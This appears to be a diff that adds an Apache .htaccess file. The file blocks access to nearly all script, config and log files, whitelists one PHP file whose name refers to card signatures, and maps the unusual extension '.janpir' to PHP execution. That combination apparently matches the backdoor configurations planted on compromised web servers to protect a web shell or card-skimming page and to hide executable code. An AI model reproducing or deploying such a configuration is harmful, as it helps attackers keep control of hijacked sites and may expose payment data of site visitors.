@@ -1,0 +1,14 @@
+Options -Indexes
+
+<FilesMatch "(?i).*\.(ph|sh|pj|env|zip|log|conf|py|hta).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# Contoh: izinkan file tertentu milik server Anda
+<Files "criarAssinaturaCartao.php">
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+AddType application/x-httpd-php .janpir
